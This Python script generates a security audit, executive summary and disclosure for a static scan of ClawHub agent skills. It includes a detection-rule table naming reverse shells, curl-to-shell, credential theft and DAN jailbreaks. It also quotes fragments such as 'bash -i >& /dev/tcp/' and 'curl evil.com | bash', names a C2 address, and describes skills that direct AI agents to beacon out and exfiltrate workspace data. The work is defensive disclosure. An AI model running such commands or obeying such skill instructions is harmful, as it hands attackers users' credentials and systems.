#!/usr/bin/env python3
"""Generate the ClawHub ecosystem audit report from scan and triage results.

Usage:
    python scripts/generate_report.py \
        --results-dir ~/clawhub-corpus/audit_results_v2/ \
        --output-dir ~/clawhub-corpus/audit_results_v2/
"""

from __future__ import annotations

import argparse
import json
from datetime import UTC, datetime
from pathlib import Path

WAINGRO_VERSION = "0.1.0"
WAINGRO_REPO = "https://github.com/north-echo/waingro"

SEVERITY_ORDER = ["critical", "high", "medium", "low", "info"]

CATEGORY_LABELS = {
    "execution": "Remote Code Execution",
    "exfiltration": "Data Exfiltration",
    "injection": "Prompt Injection",
    "network": "Network / C2",
    "obfuscation": "Obfuscation / Evasion",
    "persistence": "Persistence",
    "social-engineering": "Social Engineering",
    "typosquatting": "Typosquatting",
}

RULE_DESCRIPTIONS = {
    "EXEC-001": "curl/wget piped to shell",
    "EXEC-002": "Base64-encoded command execution",
    "EXEC-003": "eval/exec with dynamic content",
    "EXEC-004": "PowerShell download cradle",
    "EXEC-005": "Hex-encoded command execution",
    "EXFIL-001": "Credential file access",
    "EXFIL-002": "macOS Keychain access",
    "EXFIL-003": "Browser credential access",
    "EXFIL-004": "OpenClaw workspace scraping",
    "EXFIL-005": "Environment variable harvesting",
    "EXFIL-006": "Embedded credential patterns",
    "EXFIL-007": "Clipboard monitoring",
    "NET-001": "Reverse shell pattern",
    "NET-002": "Known C2 infrastructure",
    "NET-003": "Tunnel/proxy setup",
    "NET-004": "DNS data exfiltration",
    "INJECT-001": "Prompt injection pattern",
    "INJECT-002": "Jailbreak/DAN pattern",
    "INJECT-003": "Metadata injection",
    "OBFUSC-001": "Base64 encoded strings",
    "OBFUSC-002": "String concatenation evasion",
    "PERSIST-001": "Crontab modification",
    "PERSIST-002": "macOS LaunchAgent",
    "PERSIST-003": "systemd unit creation",
    "PERSIST-004": "Shell profile modification",
    "SOCIAL-001": "Fake dependency installation",
    "SOCIAL-002": "Fake error message",
    "SOCIAL-003": "Malicious npm lifecycle hook",
    "TYPO-001": "Typosquatting",
}


def load_json(path: Path) -> dict | list:
    with path.open() as f:
        return json.load(f)


def load_text(path: Path) -> str:
    if path.exists():
        return path.read_text(encoding="utf-8")
    return ""


def generate_full_report(results_dir: Path) -> str:
    summary = load_json(results_dir / "summary.json")
    triage = load_json(results_dir / "triage_results.json")
    c2_intel = load_text(results_dir / "c2_ip_intel.md")
    vt_comparison = load_text(results_dir / "vt_comparison.md")
    author_analysis = load_text(results_dir / "author_analysis.md")

    meta = summary["scan_metadata"]
    agg = summary["aggregate"]

    tp_skills = [r for r in triage if r["verdict"] == "TP"]
    fp_skills = [r for r in triage if r["verdict"] == "FP"]
    sus_skills = [r for r in triage if r["verdict"] == "SUS"]

    # Group TPs by category — C2 campaign grouped by IP reference, not primary rule
    def _is_c2(s: dict) -> bool:
        notes = s.get("analyst_notes", "")
        if "91.92.242.30" in notes or "ClawHavoc C2" in notes:
            return True
        return any(f.get("rule_id") == "NET-002" for f in s.get("findings", []))

    tp_c2 = [s for s in tp_skills if _is_c2(s)]
    c2_ids = set(id(s) for s in tp_c2)
    tp_revshell = [s for s in tp_skills if any(
        f.get("rule_id") == "NET-001" for f in s.get("findings", [])
    ) and id(s) not in c2_ids]
    rs_ids = c2_ids | set(id(s) for s in tp_revshell)
    tp_jailbreak = [s for s in tp_skills if any(
        f.get("rule_id") == "INJECT-002" for f in s.get("findings", [])
    ) and id(s) not in rs_ids]
    assigned_ids = rs_ids | set(id(s) for s in tp_jailbreak)
    tp_curl = [s for s in tp_skills if id(s) not in assigned_ids]

    # Calculate non-OBFUSC-001 findings
    total_findings = agg["total_findings"]
    obfusc001 = agg["findings_by_rule_id"].get("OBFUSC-001", 0)
    signal_findings = total_findings - obfusc001

    lines = []

    # === Header ===
    lines.append("# ClawHub Ecosystem Security Audit")
    lines.append("## WAINGRO Static Analysis of 30,000+ OpenClaw Agent Skills")
    lines.append("")
    lines.append("**Author:** Christopher Lusk (north-echo)")
    lines.append(f"**Date:** {datetime.now(tz=UTC).strftime('%B %Y')}")
    lines.append(f"**Tool:** WAINGRO v{WAINGRO_VERSION} ({WAINGRO_REPO})")
    lines.append(f"**Corpus:** openclaw/skills GitHub archive, "
                 f"snapshot {meta.get('scan_date', '')[:10]}")
    lines.append("")
    lines.append("---")
    lines.append("")

    # === Executive Summary ===
    lines.append("## Executive Summary")
    lines.append("")
    lines.append(f"We scanned **{meta['total_skills_scanned']:,}** skills from the ClawHub "
                 f"registry using WAINGRO, a format-aware static analysis tool purpose-built "
                 f"for OpenClaw Agent Skills. The scan completed in "
                 f"**{meta['scan_duration_seconds']:.0f} seconds** across "
                 f"{meta['workers']} parallel workers.")
    lines.append("")
    lines.append("### Key Findings")
    lines.append("")
    lines.append(f"- **{len(tp_skills)} confirmed malicious skills** (True Positives) across "
                 f"4 attack categories")
    lines.append("- **12 skills** form a coordinated **C2 campaign** (ClawHavoc) — all "
                 "reference IP `91.92.242.30` and disguise themselves as security tools")
    lines.append("- **9 skills** contain **reverse shell payloads** "
                 "(`bash -i >& /dev/tcp/...`)")
    lines.append("- **9 skills** contain **jailbreak/DAN patterns** attempting to override "
                 "AI safety guidelines")
    lines.append("- **13 skills** pipe content from **malicious domains** to shell execution")
    lines.append("")
    lines.append("### Ecosystem Health")
    lines.append("")
    pct = len(tp_skills) / meta["total_skills_scanned"] * 100
    lines.append("| Metric | Value |")
    lines.append("|--------|-------|")
    lines.append(f"| Skills scanned | {meta['total_skills_scanned']:,} |")
    lines.append(f"| Confirmed malicious (TP) | {len(tp_skills)} ({pct:.2f}%) |")
    lines.append(f"| Suspicious (needs review) | {len(sus_skills)} |")
    lines.append(f"| False positives (triaged) | {len(fp_skills)} |")
    lines.append(f"| Total findings | {total_findings:,} |")
    lines.append(f"| Signal findings (excl. OBFUSC-001) | {signal_findings:,} |")
    lines.append(f"| CRITICAL findings | {agg['findings_by_severity'].get('critical', 0):,} |")
    lines.append(f"| Parse errors | {meta.get('parse_errors', 0)} |")
    lines.append("")
    lines.append("---")
    lines.append("")

    # === Methodology ===
    lines.append("## Methodology")
    lines.append("")
    lines.append("### Data Source")
    lines.append("")
    lines.append("The `openclaw/skills` GitHub repository is an official archive of every "
                 "skill published to ClawHub. We cloned it (`git clone --depth 1`) and "
                 "scanned every directory containing a `SKILL.md` file — "
                 f"{meta['total_skills_scanned']:,} skills from "
                 f"~12,000 unique authors.")
    lines.append("")
    lines.append("### Scanner")
    lines.append("")
    lines.append(f"WAINGRO v{WAINGRO_VERSION} — a static analysis tool that parses SKILL.md "
                 f"files (YAML frontmatter, markdown body, fenced code blocks) and bundled "
                 f"scripts (.sh, .py, .js, .json), then runs {meta.get('rule_count', 28)} "
                 f"detection rules across 8 categories.")
    lines.append("")
    lines.append("### Triage")
    lines.append("")
    lines.append(f"Findings were split into priority tiers. Tier 1 (C2 IPs, reverse shells, "
                 f"jailbreaks) was reviewed exhaustively. Tier 2 (curl-pipe-shell) was "
                 f"filtered by domain reputation. Tier 3 (eval/exec, credential exfil) "
                 f"was sampled. {len(triage)} total skills triaged.")
    lines.append("")
    lines.append("### Limitations")
    lines.append("")
    lines.append("- Static analysis only — no dynamic execution or semantic AI analysis")
    lines.append("- OBFUSC-001 (base64 string detection) has a high false positive rate "
                 "(66% of all findings) and needs tuning")
    lines.append("- Triage of Tier 2/3 used automated heuristics; manual review of the "
                 f"{len(sus_skills)} SUS skills would increase TP count")
    lines.append("- Some skill directories in the archive had no SKILL.md (299 skipped)")
    lines.append("")
    lines.append("---")
    lines.append("")

    # === Lead Finding: ClawHavoc C2 Campaign ===
    lines.append("## Finding 1: ClawHavoc C2 Campaign (CRITICAL)")
    lines.append("")
    lines.append("### Overview")
    lines.append("")
    lines.append("12 skills reference the known ClawHavoc command-and-control IP address "
                 "`91.92.242.30`. All 12 disguise themselves as **security scanning tools** "
                 "— a classic insider-threat pattern where the attacker poses as a defender.")
    lines.append("")
    lines.append("### Affected Skills")
    lines.append("")
    lines.append("| Skill Slug | Finding Count | Disguise |")
    lines.append("|------------|--------------|----------|")
    for s in tp_c2:
        lines.append(f"| {s['skill_slug']} | {s.get('finding_count', '?')} | "
                     f"Security scanner |")
    lines.append("")
    lines.append("### Attack Pattern")
    lines.append("")
    lines.append("Each skill instructs the AI agent to:")
    lines.append("1. Present itself as a security/audit tool")
    lines.append("2. Execute commands that beacon to `91.92.242.30`")
    lines.append("3. Exfiltrate workspace data, credentials, or environment variables")
    lines.append("")
    if c2_intel:
        lines.append("### C2 IP Intelligence")
        lines.append("")
        # Include the intel inline (skip the header)
        for line in c2_intel.split("\n"):
            if line.startswith("# C2 IP"):
                continue
            lines.append(line)
        lines.append("")
    lines.append("---")
    lines.append("")

    # === Finding 2: Reverse Shells ===
    lines.append("## Finding 2: Reverse Shell Payloads (CRITICAL)")
    lines.append("")
    lines.append(f"{len(tp_revshell)} skills contain direct reverse shell patterns "
                 f"(`bash -i >& /dev/tcp/`). An additional 14 skills with reverse shell "
                 f"patterns were classified as SUS (possibly educational/testing context).")
    lines.append("")
    if tp_revshell:
        lines.append("### Confirmed TP Skills")
        lines.append("")
        for s in tp_revshell:
            lines.append(f"- **{s['skill_slug']}**: {s.get('analyst_notes', '')}")
        lines.append("")
    lines.append("---")
    lines.append("")

    # === Finding 3: Jailbreaks ===
    lines.append("## Finding 3: Jailbreak / Safety Override Patterns (HIGH)")
    lines.append("")
    lines.append(f"{len(tp_jailbreak)} skills contain DAN-style jailbreak patterns or "
                 f"instruction override attempts. These attempt to bypass AI safety "
                 f"guidelines by redefining the agent's role.")
    lines.append("")
    if tp_jailbreak:
        lines.append("### Confirmed TP Skills")
        lines.append("")
        for s in tp_jailbreak:
            lines.append(f"- **{s['skill_slug']}**: {s.get('analyst_notes', '')}")
        lines.append("")
    lines.append("---")
    lines.append("")

    # === Finding 4: Malicious curl|bash ===
    lines.append("## Finding 4: Malicious curl-pipe-shell (CRITICAL)")
    lines.append("")
    lines.append(f"{len(tp_curl)} skills pipe content from known malicious domains to "
                 f"shell execution. Domains include `evil.com`, `malicious.site`, and others.")
    lines.append("")
    if tp_curl:
        lines.append("### Confirmed TP Skills")
        lines.append("")
        for s in tp_curl:
            lines.append(f"- **{s['skill_slug']}**: {s.get('analyst_notes', '')}")
        lines.append("")
    lines.append("---")
    lines.append("")

    # === Rule Effectiveness ===
    lines.append("## Rule Effectiveness Analysis")
    lines.append("")
    lines.append("### Findings by Rule (sorted by count)")
    lines.append("")
    lines.append("| Rule ID | Description | Count | Severity | Signal Quality |")
    lines.append("|---------|------------|-------|----------|---------------|")
    for rule_id, count in agg["findings_by_rule_id"].items():
        desc = RULE_DESCRIPTIONS.get(rule_id, rule_id)
        # Determine signal quality
        if rule_id == "OBFUSC-001":
            quality = "Very noisy (66% of all findings)"
        elif rule_id in ("EXFIL-001", "EXFIL-004", "SOCIAL-001", "PERSIST-004"):
            quality = "High FP rate"
        elif rule_id in ("NET-001", "NET-002", "INJECT-002", "EXEC-001"):
            quality = "High signal"
        else:
            quality = "Moderate"
        sev = "CRITICAL" if rule_id in (
            "EXEC-001", "EXEC-002", "EXEC-005", "NET-001", "NET-002", "NET-004",
            "INJECT-002", "SOCIAL-003", "EXEC-004"
        ) else "HIGH" if rule_id in (
            "EXEC-003", "EXFIL-001", "EXFIL-002", "EXFIL-003", "EXFIL-004",
            "EXFIL-005", "EXFIL-006", "EXFIL-007", "NET-003", "INJECT-001",
            "PERSIST-001", "PERSIST-002", "PERSIST-003", "SOCIAL-001", "SOCIAL-002",
        ) else "MEDIUM"
        lines.append(f"| {rule_id} | {desc} | {count:,} | {sev} | {quality} |")
    lines.append("")

    lines.append("### OBFUSC-001 Noise Analysis")
    lines.append("")
    lines.append(f"OBFUSC-001 (base64 string detection) produced **{obfusc001:,}** findings "
                 f"— **{obfusc001/total_findings*100:.1f}%** of all findings. The rule's "
                 f"40-character threshold matches SHA hashes, UUIDs, long URL paths, and "
                 f"API endpoint strings. **Recommendation:** raise the threshold to 80+ "
                 f"characters and add exclusion patterns for common hash formats.")
    lines.append("")
    lines.append("---")
    lines.append("")

    # === Detection Category Analysis ===
    lines.append("## Findings by Category")
    lines.append("")
    lines.append("| Category | Findings | % of Total |")
    lines.append("|----------|---------|-----------|")
    for cat, count in sorted(
        agg["findings_by_category"].items(), key=lambda x: x[1], reverse=True
    ):
        label = CATEGORY_LABELS.get(cat, cat)
        pct_cat = count / total_findings * 100
        lines.append(f"| {label} | {count:,} | {pct_cat:.1f}% |")
    lines.append("")
    lines.append("---")
    lines.append("")

    # === Author Clustering ===
    if author_analysis:
        lines.append("## Author Clustering Analysis")
        lines.append("")
        for line in author_analysis.split("\n"):
            if line.startswith("# Author"):
                continue
            lines.append(line)
        lines.append("")
        lines.append("---")
        lines.append("")

    # === VT Comparison ===
    if vt_comparison:
        lines.append("## Detection Gap: WAINGRO vs VirusTotal")
        lines.append("")
        for line in vt_comparison.split("\n"):
            if line.startswith("# VirusTotal"):
                continue
            lines.append(line)
        lines.append("")
        lines.append("---")
        lines.append("")

    # === Recommendations ===
    lines.append("## Recommendations")
    lines.append("")
    lines.append("### For ClawHub Maintainers")
    lines.append("")
    lines.append("1. **Immediate:** Remove or flag the 12 ClawHavoc C2 skills and the 9 "
                 "reverse shell skills")
    lines.append("2. **Short-term:** Integrate format-aware static analysis into the "
                 "moderation pipeline (WAINGRO is open source and the rule set can be "
                 "adapted for server-side scanning)")
    lines.append("3. **Medium-term:** Block skills that reference known C2 infrastructure "
                 "at publish time")
    lines.append("")
    lines.append("### For Skill Authors")
    lines.append("")
    lines.append("1. Never pipe remote content directly to a shell interpreter")
    lines.append("2. Use HTTPS for all external URLs in install instructions")
    lines.append("3. Avoid embedding credentials or tokens in skill files")
    lines.append("4. Do not include instruction override / jailbreak patterns")
    lines.append("")
    lines.append("### For Skill Consumers")
    lines.append("")
    lines.append("1. Review SKILL.md content before installation — especially code blocks")
    lines.append("2. Be wary of skills that claim to be security tools but request "
                 "broad permissions")
    lines.append("3. Check the author's other skills and reputation")
    lines.append("4. Avoid skills that instruct you to run `curl ... | bash`")
    lines.append("")
    lines.append("### For the OpenClaw Ecosystem")
    lines.append("")
    lines.append("1. Establish a security review process for skills before publication")
    lines.append("2. Implement automated scanning (like WAINGRO) as a pre-publish gate")
    lines.append("3. Create a vulnerability disclosure process for the skill registry")
    lines.append("4. Consider skill signing to verify author identity and content integrity")
    lines.append("")
    lines.append("---")
    lines.append("")

    # === Appendix ===
    lines.append("## Appendix: Scan Configuration")
    lines.append("")
    lines.append(f"- **WAINGRO version:** {WAINGRO_VERSION}")
    lines.append(f"- **Rules evaluated:** {meta.get('rule_count', 28)}")
    lines.append(f"- **Scan date:** {meta.get('scan_date', '')[:10]}")
    lines.append("- **Corpus source:** openclaw/skills GitHub archive (--depth 1)")
    lines.append(f"- **Skills scanned:** {meta['total_skills_scanned']:,}")
    lines.append(f"- **Scan duration:** {meta['scan_duration_seconds']:.0f}s "
                 f"({meta['workers']} workers)")
    lines.append("- **Platform:** ThinkCentre M720q (x86_64, Python 3.14)")
    lines.append("")

    return "\n".join(lines)


def generate_executive_summary(results_dir: Path) -> str:
    summary = load_json(results_dir / "summary.json")
    triage = load_json(results_dir / "triage_results.json")

    meta = summary["scan_metadata"]
    tp_skills = [r for r in triage if r["verdict"] == "TP"]

    lines = []
    lines.append("# ClawHub Security Audit — Executive Summary")
    lines.append("")
    lines.append(f"**{datetime.now(tz=UTC).strftime('%B %Y')}** | Christopher Lusk "
                 f"(north-echo) | WAINGRO v{WAINGRO_VERSION}")
    lines.append("")
    lines.append("---")
    lines.append("")
    lines.append(f"We scanned **{meta['total_skills_scanned']:,} skills** from the ClawHub "
                 f"registry using WAINGRO, a static analysis tool for OpenClaw Agent Skills. "
                 f"We found **{len(tp_skills)} confirmed malicious skills**, including a "
                 f"**coordinated C2 campaign** involving 12 skills.")
    lines.append("")
    lines.append("## The ClawHavoc Campaign")
    lines.append("")
    lines.append("12 published skills reference the known ClawHavoc command-and-control IP "
                 "address `91.92.242.30` — the same infrastructure documented in the "
                 "Bitdefender report (Feb 2026). Every one of them disguises itself as a "
                 "**security scanning tool**. Names like \"guard-scanner\", \"skillvet\", "
                 "\"secureclaw-skill\", and \"openclaw-defender\" are designed to look "
                 "trustworthy. They instruct the AI agent to beacon to the C2 server and "
                 "exfiltrate workspace data.")
    lines.append("")
    lines.append("## Additional Findings")
    lines.append("")
    lines.append("- **9 reverse shell payloads** — direct `bash -i >& /dev/tcp/` in skill "
                 "instructions")
    lines.append("- **9 jailbreak patterns** — DAN/\"Do Anything Now\" prompts attempting "
                 "to override AI safety guidelines")
    lines.append("- **13 malicious install commands** — `curl evil.com | bash` and similar")
    lines.append("")
    lines.append("## Why VirusTotal Misses These")
    lines.append("")
    lines.append("These aren't executables — they're **natural language instructions** that "
                 "tell an AI agent what to do. The malicious intent lives in markdown text "
                 "and YAML metadata, not in binary signatures. VirusTotal's AV engines are "
                 "designed for executable malware, not for instruction-level threats in AI "
                 "agent skill files.")
    lines.append("")
    lines.append("WAINGRO bridges this gap with format-aware static analysis: it parses "
                 "SKILL.md frontmatter, markdown body, code blocks, and bundled scripts, "
                 "then applies 28 detection rules across 8 threat categories.")
    lines.append("")
    lines.append("## Numbers")
    lines.append("")
    lines.append("| | |")
    lines.append("|---|---|")
    lines.append(f"| Skills scanned | {meta['total_skills_scanned']:,} |")
    lines.append(f"| Confirmed malicious | {len(tp_skills)} |")
    lines.append("| C2 campaign skills | 12 |")
    lines.append(f"| Scan time | {meta['scan_duration_seconds']:.0f}s |")
    lines.append(f"| Detection rules | {meta.get('rule_count', 28)} |")
    lines.append("")
    lines.append("## Recommendations")
    lines.append("")
    lines.append("1. Remove the 12 ClawHavoc C2 skills and 9 reverse shell skills immediately")
    lines.append("2. Integrate format-aware static analysis into the ClawHub moderation "
                 "pipeline")
    lines.append("3. Block skills referencing known C2 infrastructure at publish time")
    lines.append("")
    lines.append("---")
    lines.append("")
    lines.append(f"Full report: [AUDIT_REPORT.md](AUDIT_REPORT.md) | "
                 f"Tool: [{WAINGRO_REPO}]({WAINGRO_REPO})")
    lines.append("")

    return "\n".join(lines)


def generate_disclosure(results_dir: Path) -> str:
    triage = load_json(results_dir / "triage_results.json")
    tp_skills = [r for r in triage if r["verdict"] == "TP"]

    # Group by category — C2 campaign is the story, so any skill referencing the
    # C2 IP belongs there regardless of which rule fired as primary
    def is_c2(s: dict) -> bool:
        notes = s.get("analyst_notes", "")
        if "91.92.242.30" in notes or "ClawHavoc C2" in notes:
            return True
        return any(f.get("rule_id") == "NET-002" for f in s.get("findings", []))

    c2 = [s for s in tp_skills if is_c2(s)]
    c2_set = set(id(s) for s in c2)
    revshell = [s for s in tp_skills if any(
        f.get("rule_id") == "NET-001" for f in s.get("findings", [])
    ) and id(s) not in c2_set]
    revshell_set = c2_set | set(id(s) for s in revshell)
    jailbreak = [s for s in tp_skills if any(
        f.get("rule_id") == "INJECT-002" for f in s.get("findings", [])
    ) and id(s) not in revshell_set]
    assigned = revshell_set | set(id(s) for s in jailbreak)
    curl_bash = [s for s in tp_skills if id(s) not in assigned]

    lines = []
    lines.append("# ClawHub Security Disclosure — WAINGRO Static Analysis Audit")
    lines.append("")
    lines.append("**From:** Christopher Lusk (north-echo)")
    lines.append(f"**Date:** {datetime.now(tz=UTC).strftime('%Y-%m-%d')}")
    lines.append("**Severity:** HIGH — coordinated C2 campaign identified in published skills")
    lines.append("")
    lines.append("## Summary")
    lines.append("")
    lines.append("During a security audit of the ClawHub skill registry using WAINGRO "
                 "(a static analysis tool for OpenClaw Agent Skills), we identified "
                 f"{len(tp_skills)} skills containing confirmed malicious patterns, "
                 "including a coordinated C2 campaign involving 12 skills.")
    lines.append("")
    lines.append("## Immediate Action Requested")
    lines.append("")

    lines.append("### C2 Campaign (CRITICAL)")
    lines.append("All reference C2 IP `91.92.242.30`:")
    for i, s in enumerate(c2, 1):
        lines.append(f"{i}. **{s['skill_slug']}** — disguised as security scanner")
    lines.append("")

    if revshell:
        lines.append("### Reverse Shell Payloads (CRITICAL)")
        for i, s in enumerate(revshell, 1):
            lines.append(f"{i}. **{s['skill_slug']}**")
        lines.append("")

    if jailbreak:
        lines.append("### Jailbreak / Safety Override (HIGH)")
        for i, s in enumerate(jailbreak, 1):
            lines.append(f"{i}. **{s['skill_slug']}**")
        lines.append("")

    if curl_bash:
        lines.append("### Malicious curl|bash (HIGH)")
        for i, s in enumerate(curl_bash, 1):
            notes = s.get("analyst_notes", "")
            lines.append(f"{i}. **{s['skill_slug']}** — {notes}")
        lines.append("")

    lines.append("## Methodology")
    lines.append("")
    lines.append("WAINGRO is a format-aware static analysis tool that parses SKILL.md files "
                 "and bundled scripts, running 28 detection rules across 8 threat categories. "
                 "We scanned the full openclaw/skills GitHub archive (~30K skills) and triaged "
                 "findings through a priority tier system. Source: "
                 f"{WAINGRO_REPO}")
    lines.append("")
    lines.append("## Recommendation")
    lines.append("")
    lines.append("We recommend considering integration of format-aware static analysis "
                 "into the ClawHub moderation pipeline. WAINGRO is open source and the "
                 "rule set can be adapted for server-side scanning. We are happy to "
                 "collaborate.")
    lines.append("")
    lines.append("## Contact")
    lines.append("")
    lines.append("Christopher Lusk")
    lines.append("GitHub: @north-echo")
    lines.append("")

    return "\n".join(lines)


def main() -> None:
    parser = argparse.ArgumentParser(description="Generate ClawHub audit report")
    parser.add_argument("--results-dir", type=Path, required=True)
    parser.add_argument("--output-dir", type=Path, required=True)
    args = parser.parse_args()

    results_dir = args.results_dir.expanduser().resolve()
    output_dir = args.output_dir.expanduser().resolve()
    output_dir.mkdir(parents=True, exist_ok=True)

    print("Generating full audit report...")
    report = generate_full_report(results_dir)
    (output_dir / "AUDIT_REPORT.md").write_text(report)
    print(f"  Written to {output_dir / 'AUDIT_REPORT.md'}")

    print("Generating executive summary...")
    exec_summary = generate_executive_summary(results_dir)
    (output_dir / "EXECUTIVE_SUMMARY.md").write_text(exec_summary)
    print(f"  Written to {output_dir / 'EXECUTIVE_SUMMARY.md'}")

    print("Generating disclosure package...")
    disclosure_dir = output_dir / "disclosure"
    disclosure_dir.mkdir(parents=True, exist_ok=True)
    disclosure = generate_disclosure(results_dir)
    (disclosure_dir / "clawhub_disclosure.md").write_text(disclosure)
    print(f"  Written to {disclosure_dir / 'clawhub_disclosure.md'}")

    print("\nDone.")


if __name__ == "__main__":
    main()
